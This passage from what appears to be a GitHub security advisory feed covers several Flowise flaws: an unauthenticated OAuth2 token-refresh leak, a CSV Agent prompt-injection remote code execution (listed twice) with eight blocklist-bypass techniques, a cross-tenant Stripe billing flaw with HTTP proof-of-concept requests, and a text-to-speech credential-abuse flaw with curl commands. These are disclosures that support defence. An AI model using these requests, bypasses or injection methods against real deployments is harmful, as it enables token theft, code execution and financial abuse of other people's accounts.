<li><a href="https://github.com/hypequery/hypequery/commit/4dfa9d77d70a08b970e722268b75ca7d13db0bdf">https://github.com/hypequery/hypequery/commit/4dfa9d77d70a08b970e722268b75ca7d13db0bdf</a></li>
<li><a href="https://github.com/hypequery/hypequery/blob/main/packages/clickhouse/CHANGELOG.md#202">https://github.com/hypequery/hypequery/blob/main/packages/clickhouse/CHANGELOG.md#202</a></li>
<li><a href="https://github.com/hypequery/hypequery/releases/tag/@hypequery/clickhouse@2.0.2">https://github.com/hypequery/hypequery/releases/tag/@hypequery/clickhouse@2.0.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54658">https://nvd.nist.gov/vuln/detail/CVE-2026-54658</a></li>
<li><a href="https://github.com/hypequery/hypequery/pull/349">https://github.com/hypequery/hypequery/pull/349</a></li>
<li><a href="https://github.com/hypequery/hypequery/commit/2879161a810fed2c2222f785816ff05510976960">https://github.com/hypequery/hypequery/commit/2879161a810fed2c2222f785816ff05510976960</a></li>
<li><a href="https://github.com/hypequery/hypequery/commit/2dc1df7bae">https://github.com/hypequery/hypequery/commit/2dc1df7bae</a></li>
<li><a href="https://github.com/hypequery/hypequery/releases/tag/@hypequery/clickhouse@2.5.1">https://github.com/hypequery/hypequery/releases/tag/@hypequery/clickhouse@2.5.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6wcc-39rp-hh9p">https://github.com/advisories/GHSA-6wcc-39rp-hh9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wcc-39rp-hh9p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-28T22:19:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Unauthenticated OAuth2 token refresh endpoint returns access tokens — enables token theft for any connected service]]></title>
        <id>https://github.com/advisories/GHSA-qgvm-j2hm-6m38</id>
        <link href="https://github.com/advisories/GHSA-qgvm-j2hm-6m38"/>
        <updated>2026-08-04T19:37:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The OAuth2 token refresh endpoint (<code>POST /api/v1/oauth2-credential/refresh/:credentialId</code>) is in <code>WHITELIST_URLS</code>, meaning it requires <strong>no authentication</strong>. It decrypts the stored credential (containing <code>clientId</code>, <code>clientSecret</code>, <code>refresh_token</code>), sends a refresh request to the configured OAuth provider, and returns the new <code>access_token</code> directly in the response body.</p>
<h3 id="root-cause">Root Cause</h3>
<pre><code class="language-typescript">// packages/server/src/routes/oauth2/index.ts:393-402
res.json({
    success: true,
    message: 'OAuth2 token refreshed successfully',
    credentialId: credential.id,
    tokenInfo: {
        ...tokenData,  // ← includes access_token!
        has_new_refresh_token: !!tokenData.refresh_token,
        expires_at: updatedCredentialData.expires_at
    }
})
</code></pre>
<p>Whitelist entry at <code>packages/server/src/utils/constants.ts:40</code>.</p>
<h3 id="attack-chain">Attack Chain</h3>
<ol>
<li>Attacker obtains a credential ID (via Finding 2 / public chatflow leak, or enumeration)</li>
<li>Attacker calls <code>POST /api/v1/oauth2-credential/refresh/:credentialId</code> (no auth required)</li>
<li>Server decrypts credential, sends refresh request to OAuth provider with user's <code>client_secret</code></li>
<li>Server returns the new <code>access_token</code> in the response to the attacker</li>
<li>Attacker uses the token to access the victim's connected service (Google, Microsoft, etc.)</li>
</ol>
<h3 id="docker-validation">Docker Validation</h3>
<p><code>POST /api/v1/oauth2-credential/refresh/fake-uuid</code> returns <code>{"message":"Credential not found"}</code> (not 401 Unauthorized), proving the endpoint processes the request without authentication.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>OAuth2 access token theft for any connected service</li>
<li>Full access to the victim's third-party accounts (Google, Microsoft, GitHub, etc.)</li>
<li>Client secret transmitted to OAuth provider during refresh</li>
<li>Can also be used for DoS by exhausting refresh token quota</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Remove the refresh endpoint from <code>WHITELIST_URLS</code> and require authentication:</p>
<pre><code class="language-typescript">// Remove from WHITELIST_URLS in constants.ts
// Add authentication check in the route handler
</code></pre>
<hr>
<h2 id="credits">Credits</h2>
<ul>
<li>Shinobi Security - <a href="https://github.com/shinobisecurity">https://github.com/shinobisecurity</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-qgvm-j2hm-6m38">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-qgvm-j2hm-6m38</a></li>
<li><a href="https://github.com/advisories/GHSA-qgvm-j2hm-6m38">https://github.com/advisories/GHSA-qgvm-j2hm-6m38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qgvm-j2hm-6m38</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-04T19:37:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise-components] Flowise: CSV Agent Prompt Injection Remote Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</id>
        <link href="https://github.com/advisories/GHSA-5xvg-pmgg-3mxr"/>
        <updated>2026-08-04T19:29:28.000Z</updated>
        <content type="html"><![CDATA[<p>-- ABSTRACT -------------------------------------</p>
<p>Trend Micro's Zero Day Initiative has identified a vulnerability affecting the following products:
Flowise - Flowise</p>
<p>-- VULNERABILITY DETAILS ------------------------</p>
<ul>
<li>Version tested: 3.1.1</li>
<li>Installer file: <a href="https://github.com/FlowiseAI/Flowise">https://github.com/FlowiseAI/Flowise</a> (npm install <a href="mailto:flowise@3.1.1">flowise@3.1.1</a>)</li>
<li>Platform tested: Ubuntu 25.10</li>
</ul>
<hr>
<p>A prompt injection sent to a chatflow using a CSV Agent node can cause the LLM to respond with a malicious Python script that bypasses the blocklist validator and executes in an unsandboxed pyodide environment. An attacker can leverage this to execute arbitrary code in the context of the user running the server.</p>
<pre><code>This vulnerability allows remote attackers to execute arbitrary code on affected installations of Flowise. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the run method of the CSV_Agents class. The issue results from insufficient input sanitization when using untrusted data to construct an LLM prompt. An attacker can leverage this vulnerability to execute code in the context of the service account.
</code></pre>
<h3 id="analysis">Analysis</h3>
<p>When a user makes a query against a chatflow using the CSV Agent node, the <code>run</code> method of the <code>CSV_Agents</code> class is called. This method reads the CSV file, loads a pyodide environment, and uses pandas to extract column names and data types into a dictionary. It then constructs a system prompt using that dictionary and the user's input, and sends this prompt to a configured LLM. The LLM response is stored in a variable named <code>pythonCode</code>. The method then attempts to validate this value using <code>validatePythonCodeForDataFrame</code> from <code>packages/components/src/pythonCodeValidator.ts</code> before evaluating it in pyodide.</p>
<p>The validator relies on a static regex blocklist. It can be bypassed using obfuscation techniques including string concatenation to reconstruct forbidden identifiers, <code>chr()</code> encoding, aliasing of dangerous builtins, <code>__getattribute__</code> with concatenated attribute names, frame object inspection, MRO traversal, <code>df.query()</code> expression evaluation, and decorator syntax to invoke <code>exec</code> indirectly. Furthermore, pyodide is not sandboxed from the host operating system, so any Python code that passes the validator is executed with full access to OS interfaces.</p>
<p>From <code>packages/components/nodes/agents/CSVAgent/CSVAgent.ts</code>:</p>
<pre><code class="language-ts">let pythonCode = ''
if (dataframeColDict) {
    const chain = new LLMChain({
        llm: model,
        prompt: PromptTemplate.fromTemplate(systemPrompt),
        verbose: process.env.DEBUG === 'true' ? true : false
    })
    const inputs = {
        dict: dataframeColDict,
        question: input // user-controlled input substituted into prompt
    }
    const res = await chain.call(inputs, [loggerHandler, ...callbacks])
    pythonCode = res?.text // LLM response assigned to pythonCode
    pythonCode = pythonCode.replace(/^```[a-z]+\n|\n```$/gm, '')
}

let finalResult = ''
if (pythonCode) {
    const validation = validatePythonCodeForDataFrame(pythonCode) // blocklist validation applied
    if (!validation.valid) {
        throw new Error(
            `Generated code was rejected for security reasons (${
                validation.reason ?? 'unsafe construct'
            }). Please rephrase your question to use only pandas DataFrame operations.`
        )
    }
    try {
        const code = `import pandas as pd\nimport numpy as np\n${pythonCode}`
        finalResult = await pyodide.runPythonAsync(code) // executed in unsandboxed pyodide
    } catch (error) {
        throw new Error(`Sorry, I'm unable to find answer for question: "${input}" using following code: "${pythonCode}"`)
    }
}
</code></pre>
<p>An unauthenticated attacker with the ability to send prompts to a chatflow using the CSV Agent node may use prompt injection to cause the LLM to respond with a malicious Python script. An authenticated attacker may instead configure a chatflow that points to an attacker-controlled server, which responds to LLM requests with an attacker-controlled Python payload, bypassing the LLM entirely.</p>
<p>Eight bypass variants were demonstrated against the validator:</p>
<table>
<thead>
<tr>
<th>Variant</th>
<th>Technique</th>
<th>Bypasses</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td><code>@exec</code> decorator with string-concatenated <code>__import__</code></td>
<td><code>/\bexec\s*\(/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>1</td>
<td><code>eval</code> aliased to a variable, payload chr()-encoded</td>
<td><code>/\beval\s*\(/</code>, <code>/\bimport\b/</code></td>
</tr>
<tr>
<td>2</td>
<td><code>df.query()</code> with chr()-encoded <code>@__builtins__.__import__</code></td>
<td><code>/\b__builtins__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>3</td>
<td>MRO traversal + <code>__getattribute__</code> + <code>__subclasses__</code> -&gt; <code>BuiltinImporter.load_module</code></td>
<td><code>/\b__class__\b/</code>, <code>/\b__subclasses__\s*\(/</code>, <code>/\b__mro__\b/</code></td>
</tr>
<tr>
<td>4</td>
<td>Generator frame inspection via <code>gi_frame.f_globals['__loader__']</code></td>
<td><code>/\b__loader__\b/</code>, <code>/\b__globals__\b/</code></td>
</tr>
<tr>
<td>5</td>
<td>Exception traceback frame walk to <code>f_builtins['__import__']</code></td>
<td><code>/\b__globals__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>6</td>
<td><code>__build_class__.__self__.__getattribute__('__import__')</code></td>
<td><code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>7</td>
<td><code>vars</code> aliased to a variable, <code>__builtins__</code> accessed via dict key</td>
<td><code>/\bvars\s*\(/</code>, <code>/\b__builtins__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
</tbody></table>
<h3 id="repro">Repro</h3>
<p>The proof of concept (<code>poc.py</code>) has three modes of operation:</p>
<p><strong>mode = "server"</strong>: Starts a malicious server that responds to "/api/chat" requests with a JSON object containing an LLM response with the selected attack payload.</p>
<p><strong>mode = "chatflow"</strong>: Authenticates to the Flowise server, creates a chatflow with a CSV Agent node configured to use a ChatOllama model pointed at the malicious server, and triggers a prediction to execute the payload.</p>
<p><strong>mode = "prompt_injection"</strong>: Sends a prompt injection payload directly to an existing chatflow's prediction endpoint. Due to the nature of LLM responses, it may take multiple attempts or require a different injection technique depending on the model used.</p>
<pre><code>python3 poc.py --mode [server OR chatflow OR prompt_injection] [--user &lt;USER&gt; --passwd &lt;PASSWORD&gt; --host &lt;HOST&gt; --r_host &lt;R_HOST&gt; --r_port &lt;R_PORT&gt; --l_port &lt;L_PORT&gt; --port &lt;PORT&gt; --cmd &lt;CMD&gt; --attack &lt;ATTACK&gt; --chatflow_id &lt;CHAT_ID&gt;]
</code></pre>
<p>-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Dre Cura (@dre_cura) of TrendAI Research</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5xvg-pmgg-3mxr">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5xvg-pmgg-3mxr</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6499">https://github.com/FlowiseAI/Flowise/pull/6499</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c">https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-5xvg-pmgg-3mxr">https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-04T19:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: CSV Agent Prompt Injection Remote Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</id>
        <link href="https://github.com/advisories/GHSA-5xvg-pmgg-3mxr"/>
        <updated>2026-08-04T19:29:28.000Z</updated>
        <content type="html"><![CDATA[<p>-- ABSTRACT -------------------------------------</p>
<p>Trend Micro's Zero Day Initiative has identified a vulnerability affecting the following products:
Flowise - Flowise</p>
<p>-- VULNERABILITY DETAILS ------------------------</p>
<ul>
<li>Version tested: 3.1.1</li>
<li>Installer file: <a href="https://github.com/FlowiseAI/Flowise">https://github.com/FlowiseAI/Flowise</a> (npm install <a href="mailto:flowise@3.1.1">flowise@3.1.1</a>)</li>
<li>Platform tested: Ubuntu 25.10</li>
</ul>
<hr>
<p>A prompt injection sent to a chatflow using a CSV Agent node can cause the LLM to respond with a malicious Python script that bypasses the blocklist validator and executes in an unsandboxed pyodide environment. An attacker can leverage this to execute arbitrary code in the context of the user running the server.</p>
<pre><code>This vulnerability allows remote attackers to execute arbitrary code on affected installations of Flowise. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the run method of the CSV_Agents class. The issue results from insufficient input sanitization when using untrusted data to construct an LLM prompt. An attacker can leverage this vulnerability to execute code in the context of the service account.
</code></pre>
<h3 id="analysis">Analysis</h3>
<p>When a user makes a query against a chatflow using the CSV Agent node, the <code>run</code> method of the <code>CSV_Agents</code> class is called. This method reads the CSV file, loads a pyodide environment, and uses pandas to extract column names and data types into a dictionary. It then constructs a system prompt using that dictionary and the user's input, and sends this prompt to a configured LLM. The LLM response is stored in a variable named <code>pythonCode</code>. The method then attempts to validate this value using <code>validatePythonCodeForDataFrame</code> from <code>packages/components/src/pythonCodeValidator.ts</code> before evaluating it in pyodide.</p>
<p>The validator relies on a static regex blocklist. It can be bypassed using obfuscation techniques including string concatenation to reconstruct forbidden identifiers, <code>chr()</code> encoding, aliasing of dangerous builtins, <code>__getattribute__</code> with concatenated attribute names, frame object inspection, MRO traversal, <code>df.query()</code> expression evaluation, and decorator syntax to invoke <code>exec</code> indirectly. Furthermore, pyodide is not sandboxed from the host operating system, so any Python code that passes the validator is executed with full access to OS interfaces.</p>
<p>From <code>packages/components/nodes/agents/CSVAgent/CSVAgent.ts</code>:</p>
<pre><code class="language-ts">let pythonCode = ''
if (dataframeColDict) {
    const chain = new LLMChain({
        llm: model,
        prompt: PromptTemplate.fromTemplate(systemPrompt),
        verbose: process.env.DEBUG === 'true' ? true : false
    })
    const inputs = {
        dict: dataframeColDict,
        question: input // user-controlled input substituted into prompt
    }
    const res = await chain.call(inputs, [loggerHandler, ...callbacks])
    pythonCode = res?.text // LLM response assigned to pythonCode
    pythonCode = pythonCode.replace(/^```[a-z]+\n|\n```$/gm, '')
}

let finalResult = ''
if (pythonCode) {
    const validation = validatePythonCodeForDataFrame(pythonCode) // blocklist validation applied
    if (!validation.valid) {
        throw new Error(
            `Generated code was rejected for security reasons (${
                validation.reason ?? 'unsafe construct'
            }). Please rephrase your question to use only pandas DataFrame operations.`
        )
    }
    try {
        const code = `import pandas as pd\nimport numpy as np\n${pythonCode}`
        finalResult = await pyodide.runPythonAsync(code) // executed in unsandboxed pyodide
    } catch (error) {
        throw new Error(`Sorry, I'm unable to find answer for question: "${input}" using following code: "${pythonCode}"`)
    }
}
</code></pre>
<p>An unauthenticated attacker with the ability to send prompts to a chatflow using the CSV Agent node may use prompt injection to cause the LLM to respond with a malicious Python script. An authenticated attacker may instead configure a chatflow that points to an attacker-controlled server, which responds to LLM requests with an attacker-controlled Python payload, bypassing the LLM entirely.</p>
<p>Eight bypass variants were demonstrated against the validator:</p>
<table>
<thead>
<tr>
<th>Variant</th>
<th>Technique</th>
<th>Bypasses</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td><code>@exec</code> decorator with string-concatenated <code>__import__</code></td>
<td><code>/\bexec\s*\(/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>1</td>
<td><code>eval</code> aliased to a variable, payload chr()-encoded</td>
<td><code>/\beval\s*\(/</code>, <code>/\bimport\b/</code></td>
</tr>
<tr>
<td>2</td>
<td><code>df.query()</code> with chr()-encoded <code>@__builtins__.__import__</code></td>
<td><code>/\b__builtins__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>3</td>
<td>MRO traversal + <code>__getattribute__</code> + <code>__subclasses__</code> -&gt; <code>BuiltinImporter.load_module</code></td>
<td><code>/\b__class__\b/</code>, <code>/\b__subclasses__\s*\(/</code>, <code>/\b__mro__\b/</code></td>
</tr>
<tr>
<td>4</td>
<td>Generator frame inspection via <code>gi_frame.f_globals['__loader__']</code></td>
<td><code>/\b__loader__\b/</code>, <code>/\b__globals__\b/</code></td>
</tr>
<tr>
<td>5</td>
<td>Exception traceback frame walk to <code>f_builtins['__import__']</code></td>
<td><code>/\b__globals__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>6</td>
<td><code>__build_class__.__self__.__getattribute__('__import__')</code></td>
<td><code>/\b__import__\s*\(/</code></td>
</tr>
<tr>
<td>7</td>
<td><code>vars</code> aliased to a variable, <code>__builtins__</code> accessed via dict key</td>
<td><code>/\bvars\s*\(/</code>, <code>/\b__builtins__\b/</code>, <code>/\b__import__\s*\(/</code></td>
</tr>
</tbody></table>
<h3 id="repro">Repro</h3>
<p>The proof of concept (<code>poc.py</code>) has three modes of operation:</p>
<p><strong>mode = "server"</strong>: Starts a malicious server that responds to "/api/chat" requests with a JSON object containing an LLM response with the selected attack payload.</p>
<p><strong>mode = "chatflow"</strong>: Authenticates to the Flowise server, creates a chatflow with a CSV Agent node configured to use a ChatOllama model pointed at the malicious server, and triggers a prediction to execute the payload.</p>
<p><strong>mode = "prompt_injection"</strong>: Sends a prompt injection payload directly to an existing chatflow's prediction endpoint. Due to the nature of LLM responses, it may take multiple attempts or require a different injection technique depending on the model used.</p>
<pre><code>python3 poc.py --mode [server OR chatflow OR prompt_injection] [--user &lt;USER&gt; --passwd &lt;PASSWORD&gt; --host &lt;HOST&gt; --r_host &lt;R_HOST&gt; --r_port &lt;R_PORT&gt; --l_port &lt;L_PORT&gt; --port &lt;PORT&gt; --cmd &lt;CMD&gt; --attack &lt;ATTACK&gt; --chatflow_id &lt;CHAT_ID&gt;]
</code></pre>
<p>-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Dre Cura (@dre_cura) of TrendAI Research</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5xvg-pmgg-3mxr">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5xvg-pmgg-3mxr</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6499">https://github.com/FlowiseAI/Flowise/pull/6499</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c">https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-5xvg-pmgg-3mxr">https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xvg-pmgg-3mxr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-04T19:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Broken Access Control in Stripe Subscription Endpoints Allows Cross-Tenant Billing Manipulation]]></title>
        <id>https://github.com/advisories/GHSA-gmmw-qg98-6j6p</id>
        <link href="https://github.com/advisories/GHSA-gmmw-qg98-6j6p"/>
        <updated>2026-08-04T19:24:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Several organization billing endpoints accept attacker-controlled Stripe identifiers (subscriptionId) without verifying that the identifier belongs to the authenticated user's organization. This allows an authenticated attacker to perform unauthorized Stripe subscription operations on other tenants. As a result, an authenticated user can manipulate the Stripe subscription of another organization by supplying a victim organization's subscriptionId.</p>
<p>This allows attackers to perform unauthorized billing operations such as changing subscription plans or modifying seat quantities, resulting in potential financial impact and service disruption.</p>
<h3 id="details">Details</h3>
<p>Multiple organization billing endpoints accept subscriptionId directly from user input without validating ownership. The server relies on a client-supplied Stripe subscription identifier rather than resolving the subscription from the authenticated user's organization context.</p>
<p><strong>File</strong></p>
<p>packages/server/src/enterprise/routes/organization.route.ts</p>
<p>Affected routes:</p>
<pre><code class="language-typescript">router.post('/update-additional-seats', organizationController.updateAdditionalSeats)
router.post('/update-subscription-plan', organizationController.updateSubscriptionPlan)
updateSubscriptionPlan
</code></pre>
<p><strong>File</strong></p>
<p>packages/server/src/enterprise/controllers/organization.controller.ts</p>
<pre><code class="language-typescript">public async updateSubscriptionPlan(req: Request, res: Response, next: NextFunction) {
    const { subscriptionId, newPlanId, prorationDate } = req.body

    const identityManager = getRunningExpressApp().identityManager

    const result = await identityManager.updateSubscriptionPlan(
        req,
        subscriptionId,
        newPlanId,
        prorationDate
    )

    return res.status(StatusCodes.OK).json(result)
}
</code></pre>
<p>The server trusts the user-supplied subscriptionId and forwards it to the Stripe integration layer.</p>
<p>Missing validation:
subscriptionId belongs to req.user.activeOrganization</p>
<p>updateAdditionalSeats</p>
<pre><code class="language-typescript">public async updateAdditionalSeats(req: Request, res: Response, next: NextFunction) {
    const { subscriptionId, quantity, prorationDate } = req.body

    const identityManager = getRunningExpressApp().identityManager

    const result = await identityManager.updateAdditionalSeats(
        subscriptionId,
        quantity,
        prorationDate
    )

    return res.status(StatusCodes.OK).json(result)
}
</code></pre>
<p>Again, the subscriptionId is taken directly from the request body without verifying ownership.</p>
<h3 id="poc">PoC</h3>
<p>Step 1 - Obtain victim subscriptionId</p>
<p>This identifier may be obtained via the organization read endpoint or other exposed references.</p>
<p>Example:</p>
<p>sub_YYYYYYYYYYYY</p>
<p>Step 2 - Modify victim subscription</p>
<pre><code class="language-http">POST /api/v1/organization/update-subscription-plan
Host: target.example.com
Cookie: token=&lt;attacker-session&gt;
Content-Type: application/json

{
  "subscriptionId": "sub_YYYYYYYYYYYY",
  "newPlanId": "free_plan_id",
  "prorationDate": 1735689600
}
</code></pre>
<p>Step 3 - Change seat quantity</p>
<pre><code class="language-http">POST /api/v1/organization/update-additional-seats
Host: target.example.com
Cookie: token=&lt;attacker-session&gt;
Content-Type: application/json

{
  "subscriptionId": "sub_YYYYYYYYYYYY",
  "quantity": 0,
  "prorationDate": 1735689600
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can manipulate the Stripe subscription of other organizations.</p>
<p>Possible consequences include:</p>
<ul>
<li>Unauthorized subscription upgrades to higher-priced plans</li>
<li>Manipulation of paid seat quantities leading to unintended charges</li>
<li>Service disruption through plan downgrades</li>
</ul>
<p>Because the vulnerability allows cross-tenant manipulation of billing resources, it represents a high-impact authorization flaw.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-gmmw-qg98-6j6p">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-gmmw-qg98-6j6p</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6321">https://github.com/FlowiseAI/Flowise/pull/6321</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/4d7899d02ca370a5510406be5c91483085a412f9">https://github.com/FlowiseAI/Flowise/commit/4d7899d02ca370a5510406be5c91483085a412f9</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-gmmw-qg98-6j6p">https://github.com/advisories/GHSA-gmmw-qg98-6j6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gmmw-qg98-6j6p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T19:24:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Unauthenticated Credential Abuse via Text-to-Speech Endpoint Allows Unauthorized Use of Private Chatflow TTS Credentials]]></title>
        <id>https://github.com/advisories/GHSA-8gj2-2cvc-6xx7</id>
        <link href="https://github.com/advisories/GHSA-8gj2-2cvc-6xx7"/>
        <updated>2026-08-04T19:19:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/api/v1/text-to-speech/generate</code> endpoint is whitelisted (requires no authentication) and accepts any <code>chatflowId</code> without checking whether the referenced chatflow is public. An unauthenticated attacker who knows a valid chatflow UUID can abuse that chatflow's TTS credential (OpenAI or ElevenLabs API key) to generate unlimited text-to-speech audio, incurring costs on the chatflow owner's account.</p>
<h2 id="details">Details</h2>
<p>The TTS <code>generateTextToSpeech</code> controller at <code>packages/server/src/controllers/text-to-speech/index.ts:10-171</code> is whitelisted at <code>packages/server/src/utils/constants.ts:41</code>:</p>
<pre><code class="language-typescript">'/api/v1/text-to-speech/generate',
</code></pre>
<p>When a <code>chatflowId</code> is provided and the user is not authenticated (no <code>req.user</code>), the controller falls back to fetching the chatflow without workspace scoping:</p>
<pre><code class="language-typescript">// packages/server/src/controllers/text-to-speech/index.ts:36-42
if (workspaceId) {
    chatflow = await chatflowsService.getChatflowById(chatflowId, workspaceId)
} else {
    // Fallback: get workspaceId from chatflow when req.user.activeWorkspaceId is not set
    chatflow = await chatflowsService.getChatflowById(chatflowId)  // NO isPublic check
    workspaceId = chatflow.workspaceId
}
</code></pre>
<p>The <code>getChatflowById</code> function at <code>packages/server/src/services/chatflows/index.ts:247-272</code> fetches any chatflow by ID when <code>workspaceId</code> is not provided:</p>
<pre><code class="language-typescript">const dbResponse = await appServer.AppDataSource.getRepository(ChatFlow).findOne({
    where: {
        id: chatflowId,
        ...(workspaceId ? { workspaceId } : {})  // No workspace filter when workspaceId is undefined
    }
})
</code></pre>
<p>The controller then extracts the TTS provider configuration from the chatflow:</p>
<pre><code class="language-typescript">// packages/server/src/controllers/text-to-speech/index.ts:51-66
const ttsConfig = JSON.parse(chatflow.textToSpeech)
const activeProviderKey = Object.keys(ttsConfig).find(key =&gt; ttsConfig[key].status === true)
const providerConfig = ttsConfig[activeProviderKey]
provider = activeProviderKey
credentialId = providerConfig.credentialId  // Extracted from private chatflow
</code></pre>
<p>This <code>credentialId</code> is then used to decrypt and use the stored credential (OpenAI or ElevenLabs API key) to make TTS API calls at <code>packages/components/src/textToSpeech.ts:33-34</code>:</p>
<pre><code class="language-typescript">const credentialId = textToSpeechConfig.credentialId as string
const credentialData = await getCredentialData(credentialId ?? '', options)
</code></pre>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Step 1: Know a chatflow UUID that has TTS enabled (any chatflow, public or private)
CHATFLOW_ID="&lt;any-chatflow-uuid-with-tts-enabled&gt;"

# Step 2: Abuse the TTS credential to generate audio without authentication
curl -X POST "http://localhost:3000/api/v1/text-to-speech/generate" \
  -H "Content-Type: application/json" \
  -d '{
    "chatflowId": "'${CHATFLOW_ID}'",
    "chatId": "attacker-chat-1",
    "chatMessageId": "msg-1",
    "text": "This is a test of unauthorized TTS generation using someone elses API key"
  }'

# Expected: Returns SSE stream with TTS audio data using the chatflow owner's OpenAI/ElevenLabs credentials
# event: tts_start
# data: {"event":"tts_start","data":{"chatMessageId":"msg-1","format":"mp3"}}
# event: tts_data
# data: {"event":"tts_data","data":{"chatMessageId":"msg-1","audioChunk":"&lt;base64-audio&gt;"}}

# Step 3: Repeat with large text to incur costs
curl -X POST "http://localhost:3000/api/v1/text-to-speech/generate" \
  -H "Content-Type: application/json" \
  -d '{
    "chatflowId": "'${CHATFLOW_ID}'",
    "chatId": "attacker-chat-2",
    "chatMessageId": "msg-2",
    "text": "'$(python3 -c "print('A' * 4096)")'"
  }'
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Financial Impact</strong>: An attacker can generate unlimited TTS audio using the chatflow owner's OpenAI or ElevenLabs API credentials, incurring potentially significant costs. OpenAI TTS costs ~$15/1M characters; an attacker could generate large volumes of audio.</li>
<li><strong>Credential Abuse</strong>: The attacker effectively gains indirect access to the stored API credentials without needing to authenticate or have any permissions. The credentials are not directly exposed but are used on behalf of the attacker.</li>
<li><strong>Denial of Service</strong>: By exhausting the API quota/budget of the credential, the attacker can deny service to legitimate users of the chatflow.</li>
<li><strong>Affects Private Chatflows</strong>: This vulnerability affects all chatflows with TTS configured, including those explicitly marked as private (<code>isPublic: false</code>).</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<ol>
<li>Check <code>isPublic</code> before allowing unauthenticated TTS generation:</li>
</ol>
